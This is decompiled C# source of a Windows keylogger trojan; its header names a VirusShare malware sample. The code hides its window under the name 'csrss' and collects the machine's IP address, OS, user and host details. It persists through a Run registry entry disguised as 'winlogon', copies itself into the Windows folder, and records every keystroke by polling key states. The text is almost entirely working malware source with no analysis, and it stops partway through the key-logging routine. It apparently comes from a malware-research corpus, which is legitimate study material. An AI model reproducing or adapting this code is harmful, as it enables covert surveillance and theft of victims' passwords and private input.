// Decompiled with JetBrains decompiler
// Type: Stub.Form1
// Assembly: Stub, Version=5.1.2600.5512, Culture=neutral, PublicKeyToken=null
// MVID: 70DF123C-965E-4C93-87DF-CF54B583BA08
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Spy.MSIL.KeyLogger.cwa-22811015b9cedd6f04b0b7f7807704160caa82f6f39beaed68d28841f24a36c6.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Stub.My;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Stub
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static ArrayList __ENCList = new ArrayList();
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer _Timer2;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer _Timer3;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer _Timer4;
    private const string FileSplit = "@DILSON@";
    private string[] options;
    private string text1;
    private string text2;
    private string text3;
    private const short VK_CAPITAL = 20;
    [SpecialName]
    private bool \u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bOn;
    [SpecialName]
    private bool \u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bInit;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    [DebuggerNonUserCode]
    public Form1()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCList.Add((object) new WeakReference((object) this));
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TextBox1 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.Timer2 = new System.Windows.Forms.Timer(this.components);
      this.Timer3 = new System.Windows.Forms.Timer(this.components);
      this.TextBox4 = new TextBox();
      this.Timer4 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      this.TextBox1.ScrollBars = ScrollBars.Vertical;
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(100, 20);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(12, 38);
      Point point3 = point1;
      textBox2_1.Location = point3;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(100, 20);
      Size size3 = size1;
      textBox2_2.Size = size3;
      this.TextBox2.TabIndex = 1;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(12, 64);
      Point point4 = point1;
      textBox3_1.Location = point4;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(100, 20);
      Size size4 = size1;
      textBox3_2.Size = size4;
      this.TextBox3.TabIndex = 2;
      this.Timer1.Enabled = true;
      this.Timer1.Interval = 1;
      this.Timer2.Enabled = true;
      this.Timer2.Interval = 350000;
      this.Timer3.Enabled = true;
      this.Timer3.Interval = 15000;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(39, 26);
      Point point5 = point1;
      textBox4_1.Location = point5;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(100, 20);
      Size size5 = size1;
      textBox4_2.Size = size5;
      this.TextBox4.TabIndex = 3;
      this.Timer4.Enabled = true;
      this.Timer4.Interval = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(144, 95);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.Name = nameof (Form1);
      this.Text = "csrss";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer1 != null)
          this._Timer1.Tick -= new EventHandler(this.Timer1_Tick);
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += new EventHandler(this.Timer1_Tick);
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this._Timer2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer2 != null)
          this._Timer2.Tick -= new EventHandler(this.Timer2_Tick);
        this._Timer2 = value;
        if (this._Timer2 == null)
          return;
        this._Timer2.Tick += new EventHandler(this.Timer2_Tick);
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this._Timer3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer3 != null)
          this._Timer3.Tick -= new EventHandler(this.Timer3_Tick);
        this._Timer3 = value;
        if (this._Timer3 == null)
          return;
        this._Timer3.Tick += new EventHandler(this.Timer3_Tick);
      }
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this._TextBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this._Timer4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        if (this._Timer4 != null)
          this._Timer4.Tick -= new EventHandler(this.Timer4_Tick);
        this._Timer4 = value;
        if (this._Timer4 == null)
          return;
        this._Timer4.Tick += new EventHandler(this.Timer4_Tick);
      }
    }

    [DllImport("user32", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short Getasynckeystate(int VKEY);

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short GetKeyState(int nVirtKey);

    [DllImport("Kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegisterServiceProcess(int dwProcessId, int dwType);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string GetActiveWindowTitle()
    {
      string lpString = new string(char.MinValue, 100);
      Form1.GetWindowText(Form1.GetForegroundWindow(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public bool RegWrite(string Path, string Value, string Typ = "REG_SZ")
    {
      int num1;
      bool flag;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell"));
        object[] objArray = new object[3]
        {
          (object) Path,
          (object) Value,
          (object) Typ
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[3]{ true, true, true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall(objectValue, (System.Type) null, nameof (RegWrite), Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
        if (flagArray[0])
          Path = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[0]), typeof (string));
        if (flagArray[1])
          Value = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[1]), typeof (string));
        if (flagArray[2])
          Typ = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray[2]), typeof (string));
        flag = true;
        goto label_14;
label_9:
        num2 = -1;
        switch (num1)
        {
          case 2:
            flag = false;
            goto label_14;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_9;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_14:
      int num3 = flag ? 1 : 0;
      if (num2 == 0)
        return num3 != 0;
      ProjectData.ClearProjectError();
      return num3 != 0;
    }

    public bool CAPSLOCKON()
    {
      if (!this.\u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bInit)
      {
        do
          ;
        while (Form1.Getasynckeystate(20) != (short) 0);
        this.\u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bOn = Form1.GetKeyState(20) != (short) 0;
        this.\u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bInit = true;
      }
      else if (Form1.Getasynckeystate(20) != (short) 0)
      {
        while (Form1.Getasynckeystate(20) != (short) 0)
          Application.DoEvents();
        this.\u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bOn = !this.\u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bOn;
      }
      return this.\u0024STATIC\u0024CAPSLOCKON\u00242002\u0024bOn;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.text1 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.text2 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.text3 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.text1);
      FileSystem.FileGet(1, ref this.text2);
      FileSystem.FileGet(1, ref this.text3);
      FileSystem.FileClose(1);
      this.options = Strings.Split(this.text1, "@DILSON@");
      this.TextBox2.Text = this.options[1];
      this.TextBox3.Text = this.options[2];
      this.Timer2.Interval = Conversions.ToInteger(this.options[3]);
      this.TextBox4.Text = this.options[3];
      this.start();
    }

    private void Form1_FormClosing(object eventSender, FormClosingEventArgs eventArgs)
    {
      bool cancel = eventArgs.Cancel;
      CloseReason closeReason = eventArgs.CloseReason;
      bool flag = true;
      eventArgs.Cancel = flag;
      this.Hide();
    }

    public void start()
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        string str = "";
label_2:
        num3 = 2;
        string hostName = Dns.GetHostName();
label_3:
        num3 = 3;
        IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
label_4:
        num3 = 4;
        IPAddress[] addressList = hostEntry.AddressList;
label_5:
        num3 = 5;
        str = addressList[0].ToString();
label_6:
        num3 = 6;
        this.TextBox1.Text = str + "\r\nOperating System Name : \r\n" + MyProject.Computer.Info.OSFullName.ToString() + "\r\n ; Platform : " + MyProject.Computer.Info.OSPlatform + "\r\nOperating System : " + Environment.OSVersion.ToString() + " v." + Environment.OSVersion.Version.ToString() + "\r\nComputer Name : " + Environment.MachineName.ToString() + "\r\nUser Name : " + Environment.UserName.ToString() + "\r\nSystem Directory : " + Environment.SystemDirectory.ToString() + "\r\nRunning : " + Strings.Mid(Conversions.ToString((double) Environment.TickCount / 3600000.0), 1, 5) + " Hours\r\nPhisical Memory : " + ((double) MyProject.Computer.Info.TotalPhysicalMemory / 1048576.0).ToString() + " MB\r\nCulture : " + MyProject.Computer.Info.InstalledUICulture.ToString() + "\r\nLocal Time : " + MyProject.Computer.Clock.LocalTime.ToString();
label_7:
        ProjectData.ClearProjectError();
        num1 = -2;
label_8:
        num3 = 8;
        this.RegWrite("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\winlogon", "C:\\WINDOWS\\Config\\csrss.exe");
label_9:
        num3 = 9;
        MyProject.Computer.FileSystem.MoveFile(Application.ExecutablePath, "C:\\WINDOWS\\Config\\csrss.exe");
        goto label_16;
label_11:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_5;
              case 6:
                goto label_6;
              case 7:
                goto label_7;
              case 8:
                goto label_8;
              case 9:
                goto label_9;
              case 10:
                goto label_16;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_11;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_16:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      int num1 = (int) Form1.Getasynckeystate(16);
      int num2 = (int) Form1.Getasynckeystate(65);
      if (this.CAPSLOCKON() & num1 == 0 & (num2 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num2 & 1) == 1)
        this.TextBox1.Text += "A";
      if (!this.CAPSLOCKON() & num1 == 0 & (num2 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num2 & 1) == 1)
        this.TextBox1.Text += "a";
      int num3 = (int) Form1.Getasynckeystate(66);
      if (this.CAPSLOCKON() & num1 == 0 & (num3 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num3 & 1) == 1)
        this.TextBox1.Text += "B";
      if (!this.CAPSLOCKON() & num1 == 0 & (num3 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num3 & 1) == 1)
        this.TextBox1.Text += "b";
      int num4 = (int) Form1.Getasynckeystate(67);
      if (this.CAPSLOCKON() & num1 == 0 & (num4 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num4 & 1) == 1)
        this.TextBox1.Text += "C";
      if (!this.CAPSLOCKON() & num1 == 0 & (num4 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num4 & 1) == 1)
        this.TextBox1.Text += "c";
      int num5 = (int) Form1.Getasynckeystate(68);
      if (this.CAPSLOCKON() & num1 == 0 & (num5 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num5 & 1) == 1)
        this.TextBox1.Text += "D";
      if (!this.CAPSLOCKON() & num1 == 0 & (num5 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num5 & 1) == 1)
        this.TextBox1.Text += "d";
      int num6 = (int) Form1.Getasynckeystate(69);
      if (this.CAPSLOCKON() & num1 == 0 & (num6 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num6 & 1) == 1)
        this.TextBox1.Text += "E";
      if (!this.CAPSLOCKON() & num1 == 0 & (num6 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num6 & 1) == 1)
        this.TextBox1.Text += nameof (e);
      int num7 = (int) Form1.Getasynckeystate(70);
      if (this.CAPSLOCKON() & num1 == 0 & (num7 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num7 & 1) == 1)
        this.TextBox1.Text += "F";
      if (!this.CAPSLOCKON() & num1 == 0 & (num7 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num7 & 1) == 1)
        this.TextBox1.Text += "f";
      int num8 = (int) Form1.Getasynckeystate(71);
      if (this.CAPSLOCKON() & num1 == 0 & (num8 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num8 & 1) == 1)
        this.TextBox1.Text += "G";
      if (!this.CAPSLOCKON() & num1 == 0 & (num8 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num8 & 1) == 1)
        this.TextBox1.Text += "g";
      int num9 = (int) Form1.Getasynckeystate(72);
      if (this.CAPSLOCKON() & num1 == 0 & (num9 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num9 & 1) == 1)
        this.TextBox1.Text += "H";
      if (!this.CAPSLOCKON() & num1 == 0 & (num9 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num9 & 1) == 1)
        this.TextBox1.Text += "h";
      int num10 = (int) Form1.Getasynckeystate(73);
      if (this.CAPSLOCKON() & num1 == 0 & (num10 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num10 & 1) == 1)
        this.TextBox1.Text += "I";
      if (!this.CAPSLOCKON() & num1 == 0 & (num10 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num10 & 1) == 1)
        this.TextBox1.Text += "i";
      int num11 = (int) Form1.Getasynckeystate(74);
      if (this.CAPSLOCKON() & num1 == 0 & (num11 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num11 & 1) == 1)
        this.TextBox1.Text += "J";
      if (!this.CAPSLOCKON() & num1 == 0 & (num11 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num11 & 1) == 1)
        this.TextBox1.Text += "j";
      int num12 = (int) Form1.Getasynckeystate(75);
      if (this.CAPSLOCKON() & num1 == 0 & (num12 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num12 & 1) == 1)
        this.TextBox1.Text += "K";
      if (!this.CAPSLOCKON() & num1 == 0 & (num12 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num12 & 1) == 1)
        this.TextBox1.Text += "k";
      int num13 = (int) Form1.Getasynckeystate(76);
      if (this.CAPSLOCKON() & num1 == 0 & (num13 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num13 & 1) == 1)
        this.TextBox1.Text += "L";
      if (!this.CAPSLOCKON() & num1 == 0 & (num13 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num13 & 1) == 1)
        this.TextBox1.Text += "l";
      int num14 = (int) Form1.Getasynckeystate(77);
      if (this.CAPSLOCKON() & num1 == 0 & (num14 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num14 & 1) == 1)
        this.TextBox1.Text += "M";
      if (!this.CAPSLOCKON() & num1 == 0 & (num14 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num14 & 1) == 1)
        this.TextBox1.Text += "m";
      int num15 = (int) Form1.Getasynckeystate(78);
      if (this.CAPSLOCKON() & num1 == 0 & (num15 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num15 & 1) == 1)
        this.TextBox1.Text += "N";
      if (!this.CAPSLOCKON() & num1 == 0 & (num15 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num15 & 1) == 1)
        this.TextBox1.Text += "n";
      int num16 = (int) Form1.Getasynckeystate(79);
      if (this.CAPSLOCKON() & num1 == 0 & (num16 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num16 & 1) == 1)
        this.TextBox1.Text += "O";
      if (!this.CAPSLOCKON() & num1 == 0 & (num16 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num16 & 1) == 1)
        this.TextBox1.Text += "o";
      int num17 = (int) Form1.Getasynckeystate(80);
      if (this.CAPSLOCKON() & num1 == 0 & (num17 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num17 & 1) == 1)
        this.TextBox1.Text += "P";
      if (!this.CAPSLOCKON() & num1 == 0 & (num17 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num17 & 1) == 1)
        this.TextBox1.Text += "p";
      int num18 = (int) Form1.Getasynckeystate(81);
      if (this.CAPSLOCKON() & num1 == 0 & (num18 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num18 & 1) == 1)
        this.TextBox1.Text += "Q";
      if (!this.CAPSLOCKON() & num1 == 0 & (num18 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num18 & 1) == 1)
        this.TextBox1.Text += "q";
      int num19 = (int) Form1.Getasynckeystate(82);
      if (this.CAPSLOCKON() & num1 == 0 & (num19 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num19 & 1) == 1)
        this.TextBox1.Text += "R";
      if (!this.CAPSLOCKON() & num1 == 0 & (num19 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num19 & 1) == 1)
        this.TextBox1.Text += "r";
      int num20 = (int) Form1.Getasynckeystate(83);
      if (this.CAPSLOCKON() & num1 == 0 & (num20 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num20 & 1) == 1)
        this.TextBox1.Text += "S";
      if (!this.CAPSLOCKON() & num1 == 0 & (num20 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num20 & 1) == 1)
        this.TextBox1.Text += "s";
      int num21 = (int) Form1.Getasynckeystate(84);
      if (this.CAPSLOCKON() & num1 == 0 & (num21 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num21 & 1) == 1)
        this.TextBox1.Text += "T";
      if (!this.CAPSLOCKON() & num1 == 0 & (num21 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num21 & 1) == 1)
        this.TextBox1.Text += "t";
      int num22 = (int) Form1.Getasynckeystate(85);
      if (this.CAPSLOCKON() & num1 == 0 & (num22 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num22 & 1) == 1)
        this.TextBox1.Text += "U";
      if (!this.CAPSLOCKON() & num1 == 0 & (num22 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num22 & 1) == 1)
        this.TextBox1.Text += "u";
      int num23 = (int) Form1.Getasynckeystate(86);
      if (this.CAPSLOCKON() & num1 == 0 & (num23 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num23 & 1) == 1)
        this.TextBox1.Text += "V";
      if (!this.CAPSLOCKON() & num1 == 0 & (num23 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num23 & 1) == 1)
        this.TextBox1.Text += "v";
      int num24 = (int) Form1.Getasynckeystate(87);
      if (this.CAPSLOCKON() & num1 == 0 & (num24 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num24 & 1) == 1)
        this.TextBox1.Text += "W";
      if (!this.CAPSLOCKON() & num1 == 0 & (num24 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num24 & 1) == 1)
        this.TextBox1.Text += "w";
      int num25 = (int) Form1.Getasynckeystate(88);
      if (this.CAPSLOCKON() & num1 == 0 & (num25 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num25 & 1) == 1)
        this.TextBox1.Text += "X";
      if (!this.CAPSLOCKON() & num1 == 0 & (num25 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num25 & 1) == 1)
        this.TextBox1.Text += "x";
      int num26 = (int) Form1.Getasynckeystate(89);
      if (this.CAPSLOCKON() & num1 == 0 & (num26 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num26 & 1) == 1)
        this.TextBox1.Text += "Y";
      if (!this.CAPSLOCKON() & num1 == 0 & (num26 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num26 & 1) == 1)
        this.TextBox1.Text += "y";
      int num27 = (int) Form1.Getasynckeystate(90);
      if (this.CAPSLOCKON() & num1 == 0 & (num27 & 1) == 1 | !this.CAPSLOCKON() & num1 != 0 & (num27 & 1) == 1)
        this.TextBox1.Text += "Z";
      if (!this.CAPSLOCKON() & num1 == 0 & (num27 & 1) == 1 | this.CAPSLOCKON() & num1 != 0 & (num27 & 1) == 1)
        this.TextBox1.Text += "z";
      int num28 = (int) Form1.Getasynckeystate(49);
      if (num1 == 0 & (num28 & 1) == 1)
        this.TextBox1.Text += "1";
      if (num1 != 0 & (num28 & 1) == 1)
        this.TextBox1.Text += "!";
      int num29 = (int) Form1.Getasynckeystate(50);
      if (num1 == 0 & (num29 & 1) == 1)
        this.TextBox1.Text += "2";
      if (num1 != 0 & (num29 & 1) == 1)
        this.TextBox1.Text += "@";
      int num30 = (int) Form1.Getasynckeystate(51);
      if (num1 == 0 & (num30 & 1) == 1)
        this.TextBox1.Text += "3";
      if (num1 != 0 & (num30 & 1) == 1)
        this.TextBox1.Text += "#";
      int num31 = (int) Form1.Getasynckeystate(52);
      if (num1 == 0 & (num31 & 1) == 1)
        this.TextBox1.Text += "4";
      if (num1 != 0 & (num31 & 1) == 1)
        this.TextBox1.Text += "$";
      int num32 = (int) Form1.Getasynckeystate(53);
      if (num1 == 0 & (num32 & 1) == 1)
        this.TextBox1.Text += "5";
      if (num1 != 0 & (num32 & 1) == 1)
        this.TextBox1.Text += "%";
      int num33 = (int) Form1.Getasynckeystate(54);
      if (num1 == 0 & (num33 & 1) == 1)
        this.TextBox1.Text += "6";
      if (num1 != 0 & (num33 & 1) == 1)
        this.TextBox1.Text += "^";
      int num34 = (int) Form1.Getasynckeystate(55);
      if (num1 == 0 & (num34 & 1) == 1)
        this.TextBox1.Text += "7";
      if (num1 != 0 & (num34 & 1) == 1)
        this.TextBox1.Text += "&";
      int num35 = (int) Form1.Getasynckeystate(56);
      if (num1 == 0 & (num35 & 1) == 1)
        this.TextBox1.Text += "8";
      if (num1 != 0 & (num35 & 1) == 1)
        this.TextBox1.Text += "*";
      int num36 = (int) Form1.Getasynckeystate(57);
      if (num1 == 0 & (num36 & 1) == 1)
        this.TextBox1.Text += "9";
      if (num1 != 0 & (num36 & 1) == 1)
        this.TextBox1.Text += "(";
      int num37 = (int) Form1.Getasynckeystate(48);
      if (num1 == 0 & (num37 & 1) == 1)
        this.TextBox1.Text += "0";
      if (num1 != 0 & (num37 & 1) == 1)
        this.TextBox1.Text += ")";
      if (((int) Form1.Getasynckeystate(8) & 1) == 1)
        this.TextBox1.Text += "{backspace}";
      if (((int) Form1.Getasynckeystate(9) & 1) == 1)
        this.TextBox1.Text += "{tab}";
      if (((int) Form1.Getasynckeystate(13) & 1) == 1)
        this.TextBox1.Text += "\r\n";
      if (((int) Form1.Getasynckeystate(16) & 1) == 1)
        this.TextBox1.Text += "{shift}";
      if (((int) Form1.Getasynckeystate(17) & 1) == 1)
        this.TextBox1.Text += "{ctrl}";
      if (((int) Form1.Getasynckeystate(18) & 1) == 1)
        this.TextBox1.Text += "{alt}";
      if (((int) Form1.Getasynckeystate(19) & 1) == 1)
        this.TextBox1.Text += "{pause}";
      if (((int) Form1.Getasynckeystate(27) & 1) == 1)
        this.TextBox1.Text += "{esc}";
      if (((int) Form1.Getasynckeystate(32) & 1) == 1)
        this.TextBox1.Text += " ";
      if (((int) Form1.Getasynckeystate(35) & 1) == 1)
        this.TextBox1.Text += "{end}";
      if (((int) Form1.Getasynckeystate(36) & 1) == 1)
        this.TextBox1.Text += "{home}";
      if (((int) Form1.Getasynckeystate(37) & 1) == 1)
        this.TextBox1.Text += "{left}";
      if (((int) Form1.Getasynckeystate(39) & 1) == 1)
        this.TextBox1.Text += "{right}";
      if (((int) Form1.Getasynckeystate(38) & 1) == 1)
        this.TextBox1.Text += "{up}";
      if (((int) Form1.Getasynckeystate(40) & 1) == 1)
        this.TextBox1.Text += "{down}";
      if (((int) Form1.Getasynckeystate(45) & 1) == 1)
        this.TextBox1.Text += "{insert}";
      if (((int) Form1.Getasynckeystate(46) & 1) == 1)
        this.TextBox1.Text += "{Delete}";
      int num38 = (int) Form1.Getasynckeystate(186);
      if (num1 == 0 & (num38 & 1) == 1)
        this.TextBox1.Text += ";";
      if (num1 != 0 & (num38 & 1) == 1)
        this.TextBox1.Text += ":";
      int num39 = (int) Form1.Getasynckeystate(187);
      if (num1 == 0 & (num39 & 1) == 1)
        this.TextBox1.Text += "=";
      if (num1 != 0 & (num39 & 1) == 1)
        this.TextBox1.Text += "+";
      int num40 = (int) Form1.Getasynckeystate(188);
      if (num1 == 0 & (num40 & 1) == 1)
        this.TextBox1.Text += ",";
      if (num1 != 0 & (num40 & 1) == 1)
        this.TextBox1.Text += "<";
      int num41 = (int) Form1.Getasynckeystate(189);
      if (num1 == 0 & (num41 & 1) == 1)
        this.TextBox1.Text += "-";
      if (num1 != 0 & (num41 & 1) == 1)
        this.TextBox1.Text += "_";
      int num42 = (int) Form1.Getasynckeystate(190);
      if (num1 == 0 & (num42 & 1) == 1)
        this.TextBox1.Text += ".";
      if (num1 != 0 & (num42 & 1) == 1)
        this.TextBox1.Text += ">";
      int num43 = (int) Form1.Getasynckeystate(191);
      if (num1 == 0 & (num43 & 1) == 1)
        this.TextBox1.Text += "/";
      if (num1 != 0 & (num43 & 1) == 1)
        this.TextBox1.Text += "?";
      int num44 = (int) Form1.Getasynckeystate(192);
      if (num1 == 0 & (num44 & 1) == 1)
        this.TextBox1.Text += "`";
      if (num1 != 0 & (num44 & 1) == 1)
        this.TextBox1.Text += "~";
      int num45 = (int) Form1.Getasynckeystate(219);
      if (num1 == 0 & (num45 & 1) == 1)
        this.TextBox1.Text += "[";
      if (num1 != 0 & (num45 & 1) == 1)
        this.TextBox1.Text += "{";
      int num46 = (int) Form1.Getasynckeystate(220);
      if (num1 == 0 & (num46 & 1) == 1)
        this.TextBox1.Text += "\\";
